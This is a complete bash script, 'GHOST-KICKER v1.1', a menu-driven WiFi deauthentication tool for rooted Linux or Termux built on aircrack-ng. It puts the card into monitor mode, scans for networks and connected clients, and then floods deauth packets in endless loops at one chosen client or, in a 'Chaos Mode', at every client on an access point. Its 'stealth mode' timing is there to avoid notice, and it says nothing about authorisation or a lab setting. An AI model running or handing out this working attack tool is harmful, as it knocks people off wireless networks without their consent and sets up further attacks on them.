#!/bin/bash

################################################################################
# GHOST-KICKER v1.1 - Professional WiFi Deauthentication Tool
# Platform: Linux/Termux (Rooted)
# Dependencies: aircrack-ng suite
################################################################################

# ANSI Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Global Variables
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEMP_DIR="/tmp/ghost-kicker"
SCAN_LOG="$TEMP_DIR/scan_results.log"
CSV_FILE="$TEMP_DIR/airodump-01.csv"
MONITOR_INTERFACE=""
ORIGINAL_INTERFACE=""
SMART_INTERVAL=2

################################################################################
# FUNCTION: cleanup_handler
################################################################################
cleanup_handler() {
    echo -e "\n${YELLOW}[!] Interrupt detected. Cleaning up...${NC}"
    killall airodump-ng 2>/dev/null
    killall aireplay-ng 2>/dev/null
    if [ -n "$MONITOR_INTERFACE" ]; then
        echo -e "${YELLOW}[+] Disabling monitor mode on $MONITOR_INTERFACE...${NC}"
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
    fi
    if command -v NetworkManager &>/dev/null; then
        echo -e "${YELLOW}[+] Restarting NetworkManager...${NC}"
        systemctl restart NetworkManager 2>/dev/null
    elif command -v wpa_supplicant &>/dev/null; then
        echo -e "${YELLOW}[+] Restarting wpa_supplicant...${NC}"
        systemctl restart wpa_supplicant 2>/dev/null
    fi
    echo -e "${GREEN}[✓] Cleanup complete. Network restored.${NC}"
    exit 0
}

trap cleanup_handler SIGINT

################################################################################
# FUNCTION: print_banner
################################################################################
print_banner() {
    clear
    
    # Color cycling animation
    local colors=("\033[0;31m" "\033[0;32m" "\033[0;33m" "\033[0;34m" "\033[0;35m" "\033[0;36m" "\033[0;91m" "\033[0;92m" "\033[0;93m" "\033[0;94m" "\033[0;95m" "\033[0;96m")
    
    for i in {1..3}; do
        local color="${colors[$((i % ${#colors[@]}))]}"
        echo -e "$color"
        cat << "EOF"
  ██╗   ██╗ █████╗ ███████╗██╗  ██╗██████╗  █████╗      ██╗
 ╚██╗ ██╔╝██╔══██╗██╔════╝██║  ██║██╔══██╗██╔══██╗     ██║
  ╚████╔╝ ███████║███████╗███████║██████╔╝███████║     ██║
   ╚██╔╝  ██╔══██║╚════██║██╔══██║██╔══██╗██╔══██║██   ██║
    ██║   ██║  ██║███████║██║  ██║██║  ██║██║  ██║╚█████╔╝
    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝
EOF
        echo -e "                    \033[0;36m  ~ ghemud ~\033[0m"
        sleep 0.1
        clear
    done
    
    # Final display with stable colors
    echo -e "${MAGENTA}"
    cat << "EOF"
 ██╗   ██╗ █████╗ ███████╗██╗  ██╗██████╗  █████╗      ██╗
 ╚██╗ ██╔╝██╔══██╗██╔════╝██║  ██║██╔══██╗██╔══██╗     ██║
  ╚████╔╝ ███████║███████╗███████║██████╔╝███████║     ██║
   ╚██╔╝  ██╔══██║╚════██║██╔══██║██╔══██╗██╔══██║██   ██║
    ██║   ██║  ██║███████║██║  ██║██║  ██║██║  ██║╚█████╔╝
    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝
EOF
    echo -e "                    ${CYAN}  ~ ghemud ~${NC}"
    echo -e "${YELLOW}═════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Professional WiFi Deauthentication Tool for Linux/Termux${NC}"
    echo -e "${YELLOW}═════════════════════════════════════════════════════════${NC}"
    echo ""
}

################################################################################
# FUNCTION: check_root
################################################################################
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[✗] Error: This script must be run as root!${NC}"
        echo -e "${YELLOW}[i] Run with: sudo $0${NC}"
        return 1
    fi
    echo -e "${GREEN}[✓] Root privileges confirmed.${NC}"
    return 0
}

################################################################################
# FUNCTION: check_dependencies
################################################################################
check_dependencies() {
    if ! command -v aircrack-ng &>/dev/null; then
        echo -e "${RED}[✗] Error: aircrack-ng suite not found!${NC}"
        echo ""
        echo -e "${YELLOW}[i] Install aircrack-ng:${NC}"
        echo -e "${CYAN}  For Ubuntu/Debian:${NC}"
        echo -e "    sudo apt update && sudo apt install -y aircrack-ng"
        echo -e "${CYAN}  For Termux:${NC}"
        echo -e "    pkg install aircrack-ng"
        echo -e "${CYAN}  For Arch Linux:${NC}"
        echo -e "    sudo pacman -S aircrack-ng"
        echo ""
        return 1
    fi
    echo -e "${GREEN}[✓] aircrack-ng suite found.${NC}"
    return 0
}

################################################################################
# FUNCTION: create_temp_dir
################################################################################
create_temp_dir() {
    if [ ! -d "$TEMP_DIR" ]; then
        mkdir -p "$TEMP_DIR"
        echo -e "${GREEN}[✓] Temporary directory created: $TEMP_DIR${NC}"
    fi
}

################################################################################
# FUNCTION: detect_interface
# FIX: All status messages now go to stderr; only the interface name goes to
#      stdout. This prevents $(detect_interface) from capturing debug text.
################################################################################
detect_interface() {
    echo -e "${CYAN}[?] Detecting wireless interface...${NC}" >&2

    # Try common interface names
    for iface in wlan0 wlan1 wlp0s3 wlp2s0 wifi0; do
        if ip link show "$iface" &>/dev/null; then
            echo -e "${GREEN}[✓] Wireless interface found: $iface${NC}" >&2
            ORIGINAL_INTERFACE="$iface"
            echo "$iface"   # <-- stdout only: the clean interface name
            return 0
        fi
    done

    # Fallback: search for any wireless interface
    local iface
    iface=$(iwconfig 2>/dev/null | grep -E "^[a-zA-Z]" | awk '{print $1}' | head -n1)
    if [ -n "$iface" ]; then
        echo -e "${GREEN}[✓] Wireless interface found: $iface${NC}" >&2
        ORIGINAL_INTERFACE="$iface"
        echo "$iface"
        return 0
    fi

    echo -e "${RED}[✗] No wireless interface found!${NC}" >&2
    return 1
}

################################################################################
# FUNCTION: enable_monitor_mode
# FIX: Proper regex for airmon-ng output parsing; robust fallback detection
#      using `iw dev` and `ip link`; MONITOR_INTERFACE set as true global.
################################################################################
enable_monitor_mode() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}              ENABLE MONITOR MODE${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""

    # Kill interfering processes
    echo -e "${YELLOW}[+] Killing interfering processes...${NC}"
    airmon-ng check kill >/dev/null 2>&1

    # Detect interface (clean name only on stdout; messages go to stderr)
    local iface
    iface=$(detect_interface)
    if [ -z "$iface" ]; then
        echo -e "${RED}[✗] Failed to detect wireless interface.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[+] Enabling monitor mode on $iface...${NC}"
    local mon_output
    mon_output=$(airmon-ng start "$iface" 2>&1)

    # --- Parse the monitor interface name from airmon-ng output ---
    # Pattern 1: "...[phy0]wlan0mon)" — extract the name that follows the last ']'
    # Actual airmon-ng line: (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
    local mon_iface
    mon_iface=$(echo "$mon_output" | grep -oE '\[phy[0-9]+\][a-zA-Z0-9]+' | tail -n1 | sed 's/.*\]//')

    # Pattern 2: "monitor mode enabled on wlan0mon"
    if [ -z "$mon_iface" ]; then
        mon_iface=$(echo "$mon_output" | grep -oE 'monitor mode enabled on [a-zA-Z0-9]+' | awk '{print $NF}')
    fi

    # Pattern 3: look for wlan0mon or similar in the output
    if [ -z "$mon_iface" ]; then
        mon_iface=$(echo "$mon_output" | grep -oE "[a-zA-Z0-9]+mon" | head -n1)
    fi

    # Pattern 4: check iw dev for any interface now in monitor mode (most reliable)
    if [ -z "$mon_iface" ]; then
        mon_iface=$(iw dev 2>/dev/null | awk '/Interface/{iface=$2} /type monitor/{print iface}' | head -n1)
    fi

    # Final fallback: standard naming convention
    if [ -z "$mon_iface" ]; then
        mon_iface="${iface}mon"
    fi

    # Give kernel time to register the new virtual interface
    sleep 1

    # Retry verification up to 3 times (interface may take a moment to appear)
    local retries=3
    while [ $retries -gt 0 ]; do
        # Primary check: iw dev (most reliable for wireless vifs)
        local detected
        detected=$(iw dev 2>/dev/null | awk '/Interface/{iface=$2} /type monitor/{print iface}' | head -n1)
        if [ -n "$detected" ]; then
            MONITOR_INTERFACE="$detected"
            echo -e "${GREEN}[✓] Monitor mode enabled: $MONITOR_INTERFACE${NC}"
            return 0
        fi
        # Secondary check: ip link
        if ip link show "$mon_iface" &>/dev/null; then
            MONITOR_INTERFACE="$mon_iface"
            echo -e "${GREEN}[✓] Monitor mode enabled: $MONITOR_INTERFACE${NC}"
            return 0
        fi
        # Check if original iface itself is now in monitor mode (in-place)
        local mode
        mode=$(iw dev "$iface" info 2>/dev/null | awk '/type/{print $2}')
        if [ "$mode" = "monitor" ]; then
            MONITOR_INTERFACE="$iface"
            echo -e "${GREEN}[✓] Monitor mode enabled (in-place): $MONITOR_INTERFACE${NC}"
            return 0
        fi
        retries=$((retries - 1))
        sleep 1
    done

    echo -e "${RED}[✗] Failed to enable monitor mode.${NC}"
    echo -e "${YELLOW}[i] Expected interface: $mon_iface${NC}"
    echo -e "${YELLOW}[i] airmon-ng output:${NC}"
    echo "$mon_output"
    return 1
}

################################################################################
# FUNCTION: disable_monitor_mode
################################################################################
disable_monitor_mode() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}            DISABLE MONITOR MODE & EXIT${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""

    if [ -n "$MONITOR_INTERFACE" ]; then
        echo -e "${YELLOW}[+] Stopping monitor mode on $MONITOR_INTERFACE...${NC}"
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
    fi

    echo -e "${YELLOW}[+] Restarting network services...${NC}"
    if command -v NetworkManager &>/dev/null; then
        systemctl restart NetworkManager 2>/dev/null
    elif command -v wpa_supplicant &>/dev/null; then
        systemctl restart wpa_supplicant 2>/dev/null
    fi

    echo -e "${GREEN}[✓] Monitor mode disabled. Network restored.${NC}"
    echo -e "${GREEN}[✓] yashraj exiting...${NC}"
    exit 0
}

################################################################################
# FUNCTION: scan_networks
# FIX: Clean up stale CSV/temp files before each scan so auto-target always
#      reads fresh results. Also update CSV_FILE to match airodump naming.
################################################################################
scan_networks() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}                  SCAN NETWORKS${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""

    if [ -z "$MONITOR_INTERFACE" ]; then
        echo -e "${RED}[✗] Monitor mode not enabled! Please enable monitor mode first.${NC}"
        read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
        return 1
    fi

    create_temp_dir

    # Remove stale scan files so fresh results are used
    rm -f "$TEMP_DIR"/airodump-*.csv "$TEMP_DIR/clients.txt" "$TEMP_DIR/aps.txt" 2>/dev/null

    echo -e "${YELLOW}[+] Starting network scan on $MONITOR_INTERFACE...${NC}"
    echo -e "${YELLOW}[i] Press Ctrl+C when you see your target network${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""

    # Temporarily disable SIGINT trap so Ctrl+C only stops airodump-ng, not the script
    trap - SIGINT

    # Run airodump-ng; it will create airodump-01.csv in TEMP_DIR
    airodump-ng -w "$TEMP_DIR/airodump" --output-format csv "$MONITOR_INTERFACE"

    # Re-enable SIGINT trap after scan
    trap cleanup_handler SIGINT

    echo ""

    # airodump-ng always writes airodump-01.csv; update CSV_FILE to match
    local found_csv
    found_csv=$(ls -1 "$TEMP_DIR"/airodump-*.csv 2>/dev/null | head -n1)
    if [ -n "$found_csv" ]; then
        CSV_FILE="$found_csv"
        echo -e "${GREEN}[✓] Scan completed.${NC}"
        echo -e "${YELLOW}[i] Results saved to: $CSV_FILE${NC}"
        cp "$CSV_FILE" "$SCAN_LOG"
        echo -e "${GREEN}[✓] Scan log saved to: $SCAN_LOG${NC}"
    else
        echo -e "${RED}[✗] No scan output file found. Check that $MONITOR_INTERFACE is a valid monitor interface.${NC}"
    fi

    read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
}

################################################################################
# FUNCTION: parse_csv_clients
# FIX: Properly split AP section from Station section in airodump CSV.
#      The CSV has two sections separated by a blank line.
################################################################################
parse_csv_clients() {
    # Refresh CSV_FILE path in case it was updated after scan
    local found_csv
    found_csv=$(ls -1 "$TEMP_DIR"/airodump-*.csv 2>/dev/null | head -n1)
    if [ -n "$found_csv" ]; then
        CSV_FILE="$found_csv"
    fi

    if [ ! -f "$CSV_FILE" ]; then
        echo -e "${RED}[✗] No scan results found! Please scan networks first.${NC}"
        return 1
    fi

    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}              AUTO-TARGET CLIENT SELECTOR${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""

    # Remove stale client list
    rm -f "$TEMP_DIR/clients.txt"

    # airodump CSV format:
    #   Section 1: AP lines  (BSSID, First time seen, ..., ESSID)
    #   blank line
    #   Section 2: Station lines (Station MAC, First time seen, ..., BSSID, ...)
    local in_station_section=0
    local clients_found=0

    # Build a BSSID->ESSID map from section 1
    declare -A bssid_essid_map
    while IFS=',' read -r f1 f2 f3 f4 f5 f6 f7 f8 f9 f10 f11 f12 f13 f14 rest; do
        f1="${f1// /}"
        f14="${f14// /}"
        if [[ "$f1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            local essid="${f14}"
            [ -z "$essid" ] && essid="Hidden"
            bssid_essid_map["$f1"]="$essid"
        fi
    done < "$CSV_FILE"

    # Now parse station section (lines after the blank line that separates sections)
    while IFS=',' read -r f1 f2 f3 f4 f5 f6 f7 rest; do
        f1="${f1// /}"
        f6="${f6// /}"

        # Blank line marks transition to station section
        if [ -z "$f1" ]; then
            in_station_section=1
            continue
        fi

        # Skip header line
        [ "$f1" = "Station MAC" ] && continue

        if [ "$in_station_section" -eq 1 ]; then
            if [[ "$f1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                local sta_mac="$f1"
                local ap_bssid="$f6"
                local ap_essid="${bssid_essid_map[$ap_bssid]:-Unknown}"

                # Skip stations not associated to any AP
                [[ "$ap_bssid" =~ ^(not|00:00)$ ]] && continue
                [[ ! "$ap_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue

                clients_found=$((clients_found + 1))
                echo -e "${YELLOW}  [$clients_found] Client MAC: $sta_mac${NC}"
                echo -e "${CYAN}      AP BSSID : $ap_bssid${NC}"
                echo -e "${CYAN}      Network  : $ap_essid${NC}"
                echo ""

                echo "$clients_found|$sta_mac|$ap_bssid|$ap_essid" >> "$TEMP_DIR/clients.txt"
            fi
        fi
    done < "$CSV_FILE"

    if [ "$clients_found" -eq 0 ]; then
        echo -e "${RED}[✗] No associated clients found in scan results.${NC}"
        echo -e "${YELLOW}[i] Make sure clients are connected to the network during scan.${NC}"
        return 1
    fi

    echo -e "${GREEN}[✓] Found $clients_found client(s).${NC}"
    return 0
}

################################################################################
# FUNCTION: target_specific_attack
################################################################################
target_specific_attack() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}              TARGET SPECIFIC ATTACK${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""

    if [ -z "$MONITOR_INTERFACE" ]; then
        echo -e "${RED}[✗] Monitor mode not enabled!${NC}"
        read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
        return 1
    fi

    echo -e "${YELLOW}[?] Choose input method:${NC}"
    echo -e "${CYAN}  [1] Manual Input (Type MAC addresses)${NC}"
    echo -e "${CYAN}  [2] Auto-Target (Select from scan results)${NC}"
    echo ""
    read -p "$(echo -e ${GREEN}"[>] Select option: "${NC})" choice

    local target_bssid=""
    local client_mac=""

    case $choice in
        1)
            echo ""
            read -p "$(echo -e ${YELLOW}"[>] Enter Target BSSID (AP MAC): "${NC})" target_bssid
            read -p "$(echo -e ${YELLOW}"[>] Enter Client MAC to deauth: "${NC})" client_mac
            ;;
        2)
            if ! parse_csv_clients; then
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi

            echo ""
            read -p "$(echo -e ${YELLOW}"[>] Enter client number to attack: "${NC})" client_num

            if [ ! -f "$TEMP_DIR/clients.txt" ]; then
                echo -e "${RED}[✗] Client list not found.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi

            local selected_client
            selected_client=$(grep "^${client_num}|" "$TEMP_DIR/clients.txt")
            if [ -z "$selected_client" ]; then
                echo -e "${RED}[✗] Invalid client number.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi

            client_mac=$(echo "$selected_client" | cut -d'|' -f2)
            target_bssid=$(echo "$selected_client" | cut -d'|' -f3)
            local target_essid
            target_essid=$(echo "$selected_client" | cut -d'|' -f4)

            echo ""
            echo -e "${GREEN}[✓] Target selected:${NC}"
            echo -e "${CYAN}    Client : $client_mac${NC}"
            echo -e "${CYAN}    AP     : $target_bssid${NC}"
            echo -e "${CYAN}    Network: $target_essid${NC}"
            ;;
        *)
            echo -e "${RED}[✗] Invalid option.${NC}"
            read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
            return 1
            ;;
    esac

    echo ""
    echo -e "${YELLOW}[?] Configure attack settings:${NC}"
    read -p "$(echo -e ${YELLOW}"[>] Smart Interval (seconds, default=$SMART_INTERVAL): "${NC})" interval
    if [[ "$interval" =~ ^[0-9]+$ ]] && [ "$interval" -gt 0 ]; then
        SMART_INTERVAL=$interval
    fi

    read -p "$(echo -e ${YELLOW}"[>] Target Channel (1-14, required for attack): "${NC})" channel
    if [[ ! "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 14 ]; then
        echo -e "${RED}[✗] Invalid channel. Must be 1-14.${NC}"
        read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
        return 1
    fi

    echo ""
    echo -e "${YELLOW}[+] Setting monitor interface to channel $channel...${NC}"
    iw dev "$MONITOR_INTERFACE" set channel "$channel" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Channel set to $channel${NC}"
    else
        # Fallback to iwconfig
        iwconfig "$MONITOR_INTERFACE" channel "$channel" >/dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓] Channel set to $channel (using iwconfig)${NC}"
        else
            echo -e "${YELLOW}[i] Could not set channel, will attempt attack anyway${NC}"
        fi
    fi

    echo ""
    echo -e "${RED}[!] Starting deauthentication attack...${NC}"
    echo -e "${YELLOW}[i] Smart Interval: ${SMART_INTERVAL}s (stealth mode)${NC}"
    echo -e "${YELLOW}[i] Press Ctrl+C to stop the attack${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""

    while true; do
        aireplay-ng --ignore-negative-one -0 5 -a "$target_bssid" -c "$client_mac" "$MONITOR_INTERFACE" 2>/dev/null
        echo -e "${RED}[*] Deauth packets sent to $client_mac${NC}"
        sleep "$SMART_INTERVAL"
    done
}

################################################################################
# FUNCTION: chaos_mode
################################################################################
chaos_mode() {
    echo ""
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}                   CHAOS MODE${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${RED}[⚠]  WARNING: This will deauth ALL clients on the network!${NC}"
    echo ""

    if [ -z "$MONITOR_INTERFACE" ]; then
        echo -e "${RED}[✗] Monitor mode not enabled!${NC}"
        read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
        return 1
    fi

    echo -e "${YELLOW}[?] Choose input method:${NC}"
    echo -e "${CYAN}  [1] Manual Input (Type BSSID)${NC}"
    echo -e "${CYAN}  [2] Auto-Target (Select from scan results)${NC}"
    echo ""
    read -p "$(echo -e ${GREEN}"[>] Select option: "${NC})" choice

    local target_bssid=""

    case $choice in
        1)
            echo ""
            read -p "$(echo -e ${YELLOW}"[>] Enter Target BSSID (AP MAC): "${NC})" target_bssid
            ;;
        2)
            # Refresh CSV path
            local found_csv
            found_csv=$(ls -1 "$TEMP_DIR"/airodump-*.csv 2>/dev/null | head -n1)
            [ -n "$found_csv" ] && CSV_FILE="$found_csv"

            if [ ! -f "$CSV_FILE" ]; then
                echo -e "${RED}[✗] No scan results found! Please scan networks first.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi

            # Remove stale AP list
            rm -f "$TEMP_DIR/aps.txt"

            echo ""
            echo -e "${CYAN}Available Networks:${NC}"
            echo ""

            local ap_count=0
            while IFS=',' read -r f1 f2 f3 f4 f5 f6 f7 f8 f9 f10 f11 f12 f13 f14 rest; do
                f1="${f1// /}"
                f14="${f14// /}"
                if [[ "$f1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                    ap_count=$((ap_count + 1))
                    local essid="$f14"
                    [ -z "$essid" ] && essid="Hidden Network"
                    echo -e "${GREEN}  [$ap_count] $essid${NC}"
                    echo -e "${CYAN}      BSSID: $f1${NC}"
                    echo ""
                    echo "$ap_count|$f1|$essid" >> "$TEMP_DIR/aps.txt"
                fi
            done < "$CSV_FILE"

            if [ "$ap_count" -eq 0 ]; then
                echo -e "${RED}[✗] No networks found in scan results.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi

            read -p "$(echo -e ${YELLOW}"[>] Enter network number: "${NC})" ap_num

            local selected_ap
            selected_ap=$(grep "^${ap_num}|" "$TEMP_DIR/aps.txt")
            if [ -z "$selected_ap" ]; then
                echo -e "${RED}[✗] Invalid network number.${NC}"
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                return 1
            fi

            target_bssid=$(echo "$selected_ap" | cut -d'|' -f2)
            local target_essid
            target_essid=$(echo "$selected_ap" | cut -d'|' -f3)

            echo ""
            echo -e "${GREEN}[✓] Target selected: $target_essid ($target_bssid)${NC}"
            ;;
        *)
            echo -e "${RED}[✗] Invalid option.${NC}"
            read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
            return 1
            ;;
    esac

    echo ""
    echo -e "${YELLOW}[?] Configure attack settings:${NC}"
    read -p "$(echo -e ${YELLOW}"[>] Smart Interval (seconds, default=$SMART_INTERVAL): "${NC})" interval
    if [[ "$interval" =~ ^[0-9]+$ ]] && [ "$interval" -gt 0 ]; then
        SMART_INTERVAL=$interval
    fi

    # Use auto-detected channel if available, otherwise ask for manual input
    local channel
    if [ -n "$target_channel" ]; then
        channel="$target_channel"
        echo -e "${GREEN}[✓] Using auto-detected channel: $channel${NC}"
    else
        read -p "$(echo -e ${YELLOW}"[>] Target Channel (1-14, required for attack): "${NC})" channel
        if [[ ! "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 14 ]; then
            echo -e "${RED}[✗] Invalid channel. Must be 1-14.${NC}"
            read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
            return 1
        fi
    fi

    echo ""
    echo -e "${YELLOW}[+] Setting monitor interface to channel $channel...${NC}"
    iw dev "$MONITOR_INTERFACE" set channel "$channel" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Channel set to $channel${NC}"
    else
        # Fallback to iwconfig
        iwconfig "$MONITOR_INTERFACE" channel "$channel" >/dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓] Channel set to $channel (using iwconfig)${NC}"
        else
            echo -e "${YELLOW}[i] Could not set channel, will attempt attack anyway${NC}"
        fi
    fi

    echo ""
    echo -e "${RED}[!] CHAOS MODE ACTIVATED!${NC}"
    echo -e "${RED}[!] Deauthenticating ALL clients on $target_bssid${NC}"
    echo -e "${YELLOW}[i] Smart Interval: ${SMART_INTERVAL}s (stealth mode)${NC}"
    echo -e "${YELLOW}[i] Press Ctrl+C to stop the attack${NC}"
    echo -e "${CYAN}═════════════════════════════════════════════════════════${NC}"
    echo ""

    while true; do
        aireplay-ng --ignore-negative-one -0 5 -a "$target_bssid" "$MONITOR_INTERFACE" 2>/dev/null
        echo -e "${RED}[*] Broadcast deauth packets sent to $target_bssid${NC}"
        sleep "$SMART_INTERVAL"
    done
}

################################################################################
# FUNCTION: show_menu
################################################################################
show_menu() {
    while true; do
        print_banner
        echo -e "${BOLD}${GREEN}                    MAIN MENU${NC}"
        echo -e "${YELLOW}═════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}  [1]${NC} ${GREEN}Enable Monitor Mode${NC}"
        echo -e "${CYAN}  [2]${NC} ${GREEN}Scan Networks${NC}"
        echo -e "${CYAN}  [3]${NC} ${GREEN}Target Specific Attack${NC}"
        echo -e "${CYAN}  [4]${NC} ${RED}Chaos Mode (Deauth All Clients)${NC}"
        echo -e "${CYAN}  [5]${NC} ${YELLOW}Disable Monitor Mode & Exit${NC}"
        echo ""
        echo -e "${YELLOW}═════════════════════════════════════════════════════════${NC}"
        echo ""

        if [ -n "$MONITOR_INTERFACE" ]; then
            echo -e "${GREEN}[✓] Monitor Mode: $MONITOR_INTERFACE${NC}"
        else
            echo -e "${RED}[✗] Monitor Mode: Disabled${NC}"
        fi
        echo ""

        read -p "$(echo -e ${BOLD}${GREEN}"[?] Select option: "${NC})" choice

        case $choice in
            1)
                enable_monitor_mode
                read -p "$(echo -e ${YELLOW}"[i] Press Enter to continue..."${NC})"
                ;;
            2)
                scan_networks
                ;;
            3)
                target_specific_attack
                ;;
            4)
                chaos_mode
                ;;
            5)
                disable_monitor_mode
                ;;
            *)
                echo -e "${RED}[✗] Invalid option. Please try again.${NC}"
                sleep 2
                ;;
        esac
    done
}

################################################################################
# MAIN EXECUTION
################################################################################
main() {
    if ! check_root; then
        exit 1
    fi
    if ! check_dependencies; then
        exit 1
    fi
    create_temp_dir
    show_menu
}

main
